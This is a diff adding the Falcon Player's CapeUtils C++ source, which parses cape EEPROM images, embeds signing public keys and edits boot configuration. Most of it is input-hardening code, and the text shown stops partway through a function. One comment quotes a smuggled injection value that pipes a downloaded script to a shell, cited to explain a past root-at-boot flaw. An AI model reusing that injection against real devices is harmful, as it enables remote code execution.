@@ -1,0 +1,2827 @@
+/*
+ * This file is part of the Falcon Player (FPP) and is Copyright (C)
+ * 2013-2022 by the Falcon Player Developers.
+ *
+ * The Falcon Player (FPP) is free software, and is covered under
+ * multiple Open Source licenses.  Please see the included 'LICENSES'
+ * file for descriptions of what files are covered by each license.
+ *
+ * This source file is covered under the CC-BY-ND as described in the
+ * included LICENSE.CC-BY-ND file.  This file may be modified for
+ * personal use, but modified copies MAY NOT be redistributed in any form.
+ */
+
+#include "CapeUtils.h"
+
+#include <array>
+#include <cstdio>
+#include <iostream>
+#include <map>
+#include <memory>
+#include <set>
+#include <sstream>
+#include <stdexcept>
+#include <string>
+#include <thread>
+
+#include <sys/reboot.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <vector>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <fstream>
+#include <pwd.h>
+#include <unistd.h>
+
+#include <dirent.h>
+#include <libgen.h>
+#include <string.h>
+
+#include "fpp-json.h"
+
+#include <filesystem>
+
+#include <openssl/decoder.h>
+#include <openssl/pem.h>
+#include <openssl/rsa.h>
+#include <openssl/sha.h>
+
+#if defined(PLATFORM_BBB) || defined(PLATFORM_BB64)
+#define I2C_DEV 2
+#elif defined(PLATFORM_PI)
+#define I2C_DEV 1
+#else
+#define I2C_DEV 0
+#endif
+
+// Thread-safe lookup of the "fpp" user's uid/gid.  getpwnam() returns a pointer
+// into a shared static buffer and is not reentrant, so use getpwnam_r().
+static bool getFppUserIds(uid_t& uid, gid_t& gid) {
+    char buf[16384];
+    struct passwd pwd;
+    struct passwd* result = nullptr;
+    if (getpwnam_r("fpp", &pwd, buf, sizeof(buf), &result) != 0 || result == nullptr) {
+        return false;
+    }
+    uid = result->pw_uid;
+    gid = result->pw_gid;
+    return true;
+}
+
+unsigned char fp_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x64,
+    0x31, 0x79, 0x76, 0x42, 0x4a, 0x77, 0x70, 0x37, 0x5a, 0x62, 0x33, 0x51,
+    0x33, 0x49, 0x33, 0x79, 0x58, 0x51, 0x78, 0x33, 0x61, 0x42, 0x51, 0x4a,
+    0x6d, 0x6e, 0x37, 0x70, 0x77, 0x64, 0x57, 0x0a, 0x78, 0x37, 0x41, 0x41,
+    0x2f, 0x62, 0x45, 0x32, 0x6a, 0x78, 0x50, 0x53, 0x7a, 0x6e, 0x78, 0x36,
+    0x2f, 0x41, 0x58, 0x50, 0x61, 0x5a, 0x65, 0x75, 0x5a, 0x61, 0x37, 0x55,
+    0x75, 0x54, 0x33, 0x78, 0x34, 0x39, 0x53, 0x42, 0x70, 0x5a, 0x2b, 0x5a,
+    0x56, 0x4d, 0x45, 0x58, 0x63, 0x63, 0x54, 0x6f, 0x2f, 0x55, 0x7a, 0x44,
+    0x62, 0x41, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int fp_pub_pem_len = 174;
+
+uint8_t dk_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x4e,
+    0x32, 0x76, 0x35, 0x67, 0x69, 0x6c, 0x78, 0x38, 0x55, 0x70, 0x70, 0x4f,
+    0x34, 0x6a, 0x63, 0x54, 0x38, 0x52, 0x53, 0x7a, 0x4c, 0x62, 0x49, 0x4d,
+    0x78, 0x74, 0x76, 0x32, 0x73, 0x72, 0x30, 0x0a, 0x59, 0x73, 0x4f, 0x6c,
+    0x56, 0x72, 0x68, 0x49, 0x5a, 0x5a, 0x4b, 0x62, 0x42, 0x6d, 0x39, 0x39,
+    0x6f, 0x50, 0x4f, 0x71, 0x6a, 0x57, 0x4e, 0x55, 0x6f, 0x45, 0x30, 0x53,
+    0x4c, 0x72, 0x61, 0x58, 0x49, 0x6d, 0x4b, 0x72, 0x75, 0x41, 0x74, 0x54,
+    0x53, 0x52, 0x50, 0x31, 0x42, 0x42, 0x30, 0x42, 0x52, 0x6a, 0x38, 0x45,
+    0x41, 0x77, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int dk_pub_pem_len = 174;
+uint8_t ww_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x65,
+    0x75, 0x76, 0x6b, 0x42, 0x4b, 0x51, 0x32, 0x72, 0x72, 0x4c, 0x53, 0x6a,
+    0x62, 0x5a, 0x68, 0x51, 0x77, 0x63, 0x62, 0x66, 0x70, 0x65, 0x4b, 0x5a,
+    0x4c, 0x63, 0x52, 0x77, 0x79, 0x77, 0x4e, 0x0a, 0x6a, 0x2b, 0x38, 0x6f,
+    0x44, 0x34, 0x62, 0x4f, 0x42, 0x64, 0x73, 0x4f, 0x6c, 0x63, 0x44, 0x59,
+    0x47, 0x72, 0x47, 0x64, 0x76, 0x72, 0x36, 0x72, 0x69, 0x4b, 0x78, 0x7a,
+    0x69, 0x46, 0x35, 0x66, 0x57, 0x57, 0x4f, 0x5a, 0x5a, 0x51, 0x4a, 0x74,
+    0x50, 0x75, 0x46, 0x6d, 0x54, 0x51, 0x63, 0x70, 0x62, 0x73, 0x58, 0x34,
+    0x45, 0x51, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int ww_pub_pem_len = 174;
+uint8_t jb_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x66,
+    0x58, 0x33, 0x63, 0x55, 0x44, 0x65, 0x38, 0x64, 0x30, 0x73, 0x35, 0x5a,
+    0x65, 0x4f, 0x65, 0x44, 0x56, 0x72, 0x77, 0x6b, 0x74, 0x59, 0x6f, 0x6d,
+    0x77, 0x76, 0x35, 0x6e, 0x4e, 0x35, 0x49, 0x0a, 0x39, 0x53, 0x43, 0x43,
+    0x65, 0x62, 0x6d, 0x48, 0x47, 0x6d, 0x50, 0x58, 0x4c, 0x43, 0x61, 0x54,
+    0x78, 0x59, 0x79, 0x45, 0x66, 0x6d, 0x4e, 0x6a, 0x78, 0x67, 0x34, 0x56,
+    0x44, 0x36, 0x6a, 0x78, 0x68, 0x65, 0x66, 0x30, 0x67, 0x71, 0x66, 0x7a,
+    0x6d, 0x79, 0x75, 0x76, 0x77, 0x48, 0x57, 0x7a, 0x33, 0x72, 0x79, 0x4c,
+    0x63, 0x51, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int jb_pub_pem_len = 174;
+uint8_t aah_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x54,
+    0x6d, 0x6a, 0x33, 0x5a, 0x7a, 0x78, 0x4a, 0x32, 0x57, 0x53, 0x4f, 0x74,
+    0x6d, 0x6d, 0x7a, 0x65, 0x72, 0x45, 0x36, 0x68, 0x4d, 0x35, 0x4a, 0x71,
+    0x4c, 0x36, 0x56, 0x33, 0x79, 0x36, 0x4a, 0x0a, 0x4f, 0x49, 0x32, 0x51,
+    0x58, 0x36, 0x41, 0x67, 0x6b, 0x42, 0x30, 0x6d, 0x4d, 0x54, 0x63, 0x42,
+    0x47, 0x30, 0x52, 0x7a, 0x6a, 0x4d, 0x77, 0x63, 0x37, 0x39, 0x45, 0x41,
+    0x65, 0x33, 0x44, 0x72, 0x7a, 0x35, 0x75, 0x5a, 0x45, 0x48, 0x30, 0x7a,
+    0x57, 0x54, 0x78, 0x39, 0x6a, 0x33, 0x72, 0x5a, 0x7a, 0x49, 0x75, 0x58,
+    0x47, 0x67, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int aah_pub_pem_len = 174;
+
+unsigned char fpp_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x59,
+    0x73, 0x44, 0x6a, 0x63, 0x45, 0x41, 0x52, 0x38, 0x69, 0x4c, 0x6d, 0x39,
+    0x53, 0x4a, 0x4b, 0x57, 0x6a, 0x42, 0x57, 0x79, 0x50, 0x56, 0x41, 0x72,
+    0x76, 0x49, 0x41, 0x68, 0x79, 0x47, 0x71, 0x0a, 0x38, 0x69, 0x45, 0x53,
+    0x76, 0x36, 0x4c, 0x37, 0x56, 0x52, 0x63, 0x58, 0x47, 0x4f, 0x49, 0x43,
+    0x4e, 0x74, 0x2b, 0x56, 0x38, 0x51, 0x5a, 0x54, 0x55, 0x52, 0x4d, 0x6d,
+    0x45, 0x58, 0x44, 0x64, 0x6e, 0x5a, 0x43, 0x68, 0x65, 0x45, 0x65, 0x6b,
+    0x77, 0x76, 0x77, 0x47, 0x4b, 0x4b, 0x68, 0x4e, 0x36, 0x77, 0x5a, 0x71,
+    0x64, 0x77, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int fpp_pub_pem_len = 174;
+
+unsigned char sh_pub_pem[] = {
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
+    0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
+    0x2d, 0x2d, 0x0a, 0x4d, 0x46, 0x59, 0x77, 0x45, 0x41, 0x59, 0x48, 0x4b,
+    0x6f, 0x5a, 0x49, 0x7a, 0x6a, 0x30, 0x43, 0x41, 0x51, 0x59, 0x46, 0x4b,
+    0x34, 0x45, 0x45, 0x41, 0x41, 0x6f, 0x44, 0x51, 0x67, 0x41, 0x45, 0x71,
+    0x30, 0x4f, 0x66, 0x6a, 0x51, 0x50, 0x39, 0x44, 0x73, 0x59, 0x45, 0x5a,
+    0x43, 0x69, 0x76, 0x5a, 0x53, 0x73, 0x5a, 0x73, 0x55, 0x50, 0x47, 0x6b,
+    0x66, 0x6b, 0x4c, 0x55, 0x72, 0x78, 0x61, 0x0a, 0x76, 0x51, 0x52, 0x79,
+    0x34, 0x45, 0x4b, 0x46, 0x62, 0x6a, 0x59, 0x6a, 0x55, 0x72, 0x71, 0x39,
+    0x53, 0x6e, 0x71, 0x6d, 0x51, 0x69, 0x50, 0x36, 0x58, 0x32, 0x6a, 0x67,
+    0x30, 0x32, 0x35, 0x78, 0x46, 0x45, 0x51, 0x58, 0x61, 0x57, 0x49, 0x58,
+    0x30, 0x4a, 0x77, 0x34, 0x74, 0x38, 0x43, 0x37, 0x36, 0x36, 0x64, 0x79,
+    0x43, 0x51, 0x3d, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e,
+    0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59,
+    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
+};
+unsigned int sh_pub_pem_len = 174;
+
+static std::map<std::string, std::pair<const uint8_t*, int>> KEYS = {
+    { "fp", std::pair(fp_pub_pem, fp_pub_pem_len) },
+    { "dk", std::pair(dk_pub_pem, dk_pub_pem_len) },
+    { "ww", std::pair(ww_pub_pem, ww_pub_pem_len) },
+    { "jb", std::pair(jb_pub_pem, jb_pub_pem_len) },
+    { "aah", std::pair(aah_pub_pem, aah_pub_pem_len) },
+    { "fpp", std::pair(fpp_pub_pem, fpp_pub_pem_len) },
+    { "sh", std::pair(sh_pub_pem, sh_pub_pem_len) }
+};
+
+template<typename... Args>
+std::string string_sprintf(const char* format, Args... args) {
+    int length = std::snprintf(nullptr, 0, format, args...);
+    char* buf = new char[length + 1];
+    std::snprintf(buf, length + 1, format, args...);
+
+    std::string str(buf);
+    delete[] buf;
+    return std::move(str);
+}
+
+// One single-quoted shell word.  Pin names, modes and module names reach the
+// shell from cape-info.json, which an unsigned (uploaded) EEPROM supplies:
+// pasted in bare, "x;curl h/s|sh" ran as root at boot.
+static std::string CapeShellQuote(const std::string& v) {
+    std::string out = "'";
+    for (char ch : v) {
+        out += (ch == '\'') ? std::string("'\\''") : std::string(1, ch);
+    }
+    out += "'";
+    return out;
+}
+// A module spec ("name" or "name param=value ...") as quoted shell words.
+static std::string QuotedModuleSpec(const std::string& spec) {
+    std::string out;
+    size_t pos = 0;
+    while (pos < spec.size()) {
+        size_t end = spec.find(' ', pos);
+        if (end == std::string::npos) {
+            end = spec.size();
+        }
+        if (end > pos) {
+            out += (out.empty() ? "" : " ") + CapeShellQuote(spec.substr(pos, end - pos));
+        }
+        pos = end + 1;
+    }
+    return out;
+}
+
+static std::string exec(const std::string& cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    struct PipeCloser { void operator()(FILE* f) const { if (f) pclose(f); } };
+    std::unique_ptr<FILE, PipeCloser> pipe(popen(cmd.c_str(), "r"));
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+static bool file_exists(const std::string& f) {
+    return access(f.c_str(), F_OK) != -1;
+}
+static std::string trim(std::string str) {
+    // remove trailing white space
+    while (!str.empty() && (std::isspace(str.back()) || str.back() == 0))
+        str.pop_back();
+
+    // return residue after leading white space
+    std::size_t pos = 0;
+    while (pos < str.size() && std::isspace(str[pos]))
+        ++pos;
+    return str.substr(pos);
+}
+static std::string read_string(FILE* file, int len) {
+    std::string buf;
+    buf.reserve(len + 1);
+    buf.resize(len);
+    fread(&buf[0], 1, len, file);
+    return trim(buf);
+}
+
+// The EEPROM image is the largest thing parseEEPROM()'s buffers hold.
+static constexpr int MAX_EEPROM_SIZE = 32768;
+
+// A section's length field.  Everything in the image is untrusted until the
+// signature is checked - and a virtual EEPROM is an uploaded file, not a
+// 32K chip - so a negative length (fseek backwards: the parse never ends) or
+// one past the buffers (heap overflow) is a corrupt image.
+static int read_section_length(FILE* file) {
+    int len = std::stoi(read_string(file, 6));
+    if (len < 0 || len > MAX_EEPROM_SIZE) {
+        throw std::runtime_error("invalid section length " + std::to_string(len));
+    }
+    return len;
+}
+
+// A file name from a section, relative to the extraction directory.  These are
+// read before the signature is known, so nothing that could leave that
+// directory is accepted.
+static std::string checked_section_name(const std::string& name) {
+    if (name.empty() || name[0] == '/' || name.back() == '/') {
+        throw std::runtime_error("invalid file name in EEPROM: '" + name + "'");
+    }
+    for (char c : name) {
+        if (!isalnum((unsigned char)c) && c != '.' && c != '_' && c != '-' && c != '/' && c != '+') {
+            throw std::runtime_error("invalid file name in EEPROM: '" + name + "'");
+        }
+    }
+    std::stringstream parts(name);
+    std::string part;
+    while (std::getline(parts, part, '/')) {
+        if (part.empty() || part == "." || part == "..") {
+            throw std::runtime_error("invalid file name in EEPROM: '" + name + "'");
+        }
+    }
+    return name;
+}
+
+// Run an archive tool in dir with no shell in between: the archive's name
+// came from the EEPROM.  Waits for that child only (fppd sets SA_NOCLDWAIT).
+static void run_in_dir(const std::string& dir, const std::vector<std::string>& args) {
+    std::vector<char*> argv;
+    for (auto& a : args) {
+        argv.push_back((char*)a.c_str());
+    }
+    argv.push_back(nullptr);
+    pid_t pid = fork();
+    if (pid < 0) {
+        throw std::runtime_error("fork failed");
+    }
+    if (pid == 0) {
+        int devnull = open("/dev/null", O_RDWR);
+        if (devnull >= 0) {
+            dup2(devnull, 0);
+            dup2(devnull, 1);
+            dup2(devnull, 2);
+        }
+        if (chdir(dir.c_str()) == 0) {
+            execvp(argv[0], argv.data());
+        }
+        _exit(127);
+    }
+    while (waitpid(pid, nullptr, 0) < 0 && errno == EINTR) {
+    }
+}
+
+static void put_file_contents(const std::string& path, const uint8_t* data, int len) {
+    FILE* f = fopen(path.c_str(), "w+b");
+    if (f == nullptr) {
+        throw std::runtime_error("could not write " + path + ": " + strerror(errno));
+    }
+    fwrite(data, 1, len, f);
+    fclose(f);
+
+    uid_t fppUid = 0;
+    gid_t fppGid = 0;
+    if (getFppUserIds(fppUid, fppGid)) {
+        chown(path.c_str(), fppUid, fppGid);
+    }
+
+    mode_t mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH;
+    chmod(path.c_str(), mode);
+}
+// An unreadable file comes back empty (len 0, still a terminated buffer the
+// caller frees), which the callers already treat as "nothing there"; a null
+// FILE* used to go straight into fseek().
+static uint8_t* get_file_contents(const std::string& path, int& len) {
+    len = 0;
+    FILE* fp = fopen(path.c_str(), "rb");
+    if (fp != nullptr) {
+        fseek(fp, 0L, SEEK_END);
+        long l = ftell(fp);
+        fseek(fp, 0L, SEEK_SET);
+        len = l > 0 ? (int)l : 0;
+    }
+    uint8_t* data = (uint8_t*)malloc(len + 1);
+    if (fp != nullptr) {
+        len = (int)fread(data, 1, len, fp);
+        fclose(fp);
+    }
+    data[len] = 0;
+    return data;
+}
+
+#ifdef PLATFORM_PI
+static const std::string PLATFORM_DIR = "pi";
+const std::string& getPlatformCapeDir() { return PLATFORM_DIR; }
+#elif defined(PLATFORM_BB64)
+static const std::string PLATFORM_DIR = "bb64";
+const std::string& getPlatformCapeDir() { return PLATFORM_DIR; }
+#elif defined(PLATFORM_BBB)
+static const std::string PLATFORM_DIR_BBB = "bbb";
+static const std::string PLATFORM_DIR_PB = "pb";
+const std::string& getPlatformCapeDir() {
+    int len = 0;
+    char* buf = (char*)get_file_contents("/proc/device-tree/model", len);
+    if (strcmp(&buf[10], "PocketBeagle") == 0) {
+        free(buf);
+        return PLATFORM_DIR_PB;
+    }
+    free(buf);
+    return PLATFORM_DIR_BBB;
+}
+
+#else
+static const std::string PLATFORM_DIR = "";
+const std::string& getPlatformCapeDir() { return PLATFORM_DIR; }
+#endif
+
+// A file that parses but holds the wrong kind of value at its root - an array
+// where an object is expected - is a corrupt config, not usable data: the
+// jsoncpp accessor the caller reaches for next throws Json::LogicError, and
+// nothing here catches it. Callers pass the root they require so that throw
+// stays unreachable. This mirrors the JsonRoot check on FPP's own loader in
+// common.cpp; it is duplicated rather than shared because CapeUtils is a
+// standalone component that does not pull in common.h.
+enum class CapeJsonRoot {
+    Object,
+    Array
+};
+static bool LoadJsonFromFile(const std::string& filename, Json::Value& root, CapeJsonRoot expected) {
+    if (!file_exists(filename)) {
+        return false;
+    }
+    int len = 0;
+    char* data = (char*)get_file_contents(filename, len);
+
+    Json::CharReaderBuilder builder;
+    Json::CharReader* reader = builder.newCharReader();
+    std::string errors;
+    builder["collectComments"] = false;
+    bool success = reader->parse(data, data + len, &root, &errors);
+    delete reader;
+
+    free(data);
+    if (!success) {
+        printf("Failed to parse %s: %s\n", filename.c_str(), errors.c_str());
+        return false;
+    }
+
+    // A null root is not a mismatch - jsoncpp treats null as an empty value of
+    // whatever type it is first used as and never throws on it.
+    Json::ValueType expectedType = (expected == CapeJsonRoot::Array) ? Json::arrayValue : Json::objectValue;
+    if (root.isNull()) {
+        root = Json::Value(expectedType);
+        return true;
+    }
+    if (root.type() != expectedType) {
+        printf("Wrong root type in %s: expected %s - treating as empty\n",
+               filename.c_str(), (expectedType == Json::arrayValue) ? "array" : "object");
+        root = Json::Value(expectedType);
+        return false;
+    }
+    return true;
+}
+
+static void disableOutputs(Json::Value& disables) {
+    for (int x = 0; x < disables.size(); x++) {
+        std::string file = disables[x]["file"].asString();
+        std::string type = disables[x]["type"].asString();
+        std::string subType = "";
+        if (disables[x].isMember("subType")) {
+            subType = disables[x]["subType"].asString();
+        }
+        std::string fullFile = "/home/fpp/media/" + file;
+        if (file_exists(fullFile)) {
+            Json::Value result;
+            Json::CharReaderBuilder builder;
+            Json::CharReader* reader = builder.newCharReader();
+            std::string errors;
+            std::ifstream istream(fullFile);
+            std::stringstream buffer;
+            buffer << istream.rdbuf();
+            istream.close();
+
+            std::string str = buffer.str();
+            bool success = reader->parse(str.c_str(), str.c_str() + str.size(), &result, &errors);
+            if (success) {
+                bool changed = false;
+                if (result.isMember("channelOutputs")) {
+                    for (int co = 0; co < result["channelOutputs"].size(); co++) {
+                        if (result["channelOutputs"][co]["type"].asString() == type && (subType == "" || (result["channelOutputs"][co].isMember("subType") && result["channelOutputs"][co]["subType"].asString() == subType))) {
+                            if (result["channelOutputs"][co]["enabled"].asInt() == 1) {
+                                result["channelOutputs"][co]["enabled"] = 0;
+                                changed = true;
+                            }
+                        }
+                    }
+                }
+                if (changed) {
+                    Json::StreamWriterBuilder wbuilder;
+                    std::string resultStr = Json::writeString(wbuilder, result);
+                    put_file_contents(fullFile, (const uint8_t*)resultStr.c_str(), resultStr.size());
+                }
+            }
+        }
+    }
+}
+// The boot partition is mounted at /boot on some platforms and /boot/firmware on
+// others, and that can differ between images of the same OS release, so it cannot
+// be baked in at build time.  Debian 12 on the BBB eMMC is the awkward case: it
+// keeps uEnv.txt in /boot but still mounts an empty FAT filesystem on
+// /boot/firmware, so the existence of the directory tells us nothing.  Locate the
+// boot config by looking for the file itself, newest layout first.  Returns an
+// empty string if it isn't found in either location.
+[[maybe_unused]] static std::string findBootConfigFile(const std::string& filename) {
+    for (const char* dir : { "/boot/firmware", "/boot" }) {
+        std::string path = std::string(dir) + "/" + filename;
+        if (file_exists(path)) {
+            return path;
+        }
+    }
+    return "";
+}
+// Is this directive already present in the boot config as a line of its own?
+//
+// A plain substring search used to stand in for this, and it stops being correct
+// the moment one directive is a prefix of another: "dtoverlay=fpp-cape-overlay"
+// is a substring of "dtoverlay=fpp-cape-overlay-pi5", so a config.txt carrying
+// only a variant line looked like it already had the base overlay and the base
+// line was never written.  The cape then boots with its board specific fragments
+// and nothing else, which is a worse failure than having no overlay at all.
+// Surrounding whitespace is tolerated because the old behaviour tolerated an
+// indented line; a longer directive on the same line is not.
+static bool configContainsDirective(const std::string& config, const std::string& directive) {
+    if (directive.empty()) {
+        return false;
+    }
+    for (size_t pos = config.find(directive); pos != std::string::npos;
+         pos = config.find(directive, pos + 1)) {
+        size_t b = pos;
+        while (b > 0 && (config[b - 1] == ' ' || config[b - 1] == '\t')) {
+            --b;
+        }
+        if (b != 0 && config[b - 1] != '\n') {
+            continue;
+        }
+        size_t e = pos + directive.length();
+        while (e < config.length() && (config[e] == ' ' || config[e] == '\t' || config[e] == '\r')) {
+            ++e;
+        }
+        if (e == config.length() || config[e] == '\n') {
+            return true;
+        }
+    }
+    return false;
+}
+// What an unsigned cape may do to the boot config: add or drop device tree
+// overlays and parameters, which is what capes use it for.  Anything else
+// there (kernel=, initramfs, cmdline=, init=) decides what the box boots, and
+// an unsigned image is as often an uploaded file as it is a chip.  One line
+// only: an embedded newline would carry any directive in behind an allowed
+// prefix.
+static bool UnsignedBootConfigLineAllowed(const std::string& v) {
+    for (char ch : v) {
+        if ((unsigned char)ch < 0x20 && ch != '\t') {
+            return false;
+        }
+    }
+    auto startsWith = [&v](const char* p) { return v.rfind(p, 0) == 0 && v.size() > strlen(p); };
+#if defined(PLATFORM_BBB)
+    // uEnv.txt: overlay slots 0 and 1 hold FPP's own base and cape overlays.
+    return startsWith("uboot_overlay_addr") && v.size() > 20 && v[18] >= '2' && v[18] <= '7' && v[19] == '=';
+#elif defined(PLATFORM_ARMBIAN)
+    return startsWith("overlays=") || startsWith("param_");
+#else
+    return startsWith("dtoverlay=") || startsWith("dtparam=");
+#endif
+}
+
+// Remove every line of config that is exactly directive (ignoring the
+// surrounding blanks configContainsDirective() ignores).  An unsigned cape's
+// remove is held to whole lines: as a substring erase, "dtparam=" stripped
+// that prefix from every dtparam line in the file.
+static void removeDirectiveLines(std::string& config, const std::string& directive) {
+    std::string out;
+    size_t pos = 0;
+    while (pos < config.size()) {
+        size_t end = config.find('\n', pos);
+        size_t next = (end == std::string::npos) ? config.size() : end + 1;
+        std::string line = config.substr(pos, (end == std::string::npos ? config.size() : end) - pos);
+        size_t b = line.find_first_not_of(" \t");
+        size_t e = line.find_last_not_of(" \t\r");
+        bool match = b != std::string::npos && line.compare(b, e - b + 1, directive) == 0;
+        if (!match) {
+            out.append(config, pos, next - pos);
+        }
+        pos = next;
+    }
+    config = out;
+}
+
+static bool processBootConfig(Json::Value& bootConfig, bool trusted) {
+#if defined(PLATFORM_PI)
+    const std::string fileName = findBootConfigFile("config.txt");
+#elif defined(PLATFORM_BBB)
+    const std::string fileName = findBootConfigFile("uEnv.txt");
+#elif defined(PLATFORM_BB64)
+    // TODO - booting is VERY different on BB64
+    const std::string fileName;
+#elif defined(PLATFORM_ARMBIAN)
+    const std::string fileName = findBootConfigFile("armbianEnv.txt");
+#else
+    // unknown platform
+    const std::string fileName;
+#endif
+
+    if (fileName.empty())
+        return false;
+
+    int len = 0;
+    uint8_t* data = get_file_contents(fileName, len);
+    if (len == 0) {
+        return false;
+    }
+    std::string current = (char*)data;
+    std::string orig = current;
+    if (bootConfig.isMember("remove")) {
+        for (int x = 0; x < bootConfig["remove"].size(); x++) {
+            std::string v = bootConfig["remove"][x].asString();
+            // find("") matches at 0 forever and erasing it removes nothing, so
+            // an empty entry spun here for good and boot never finished.
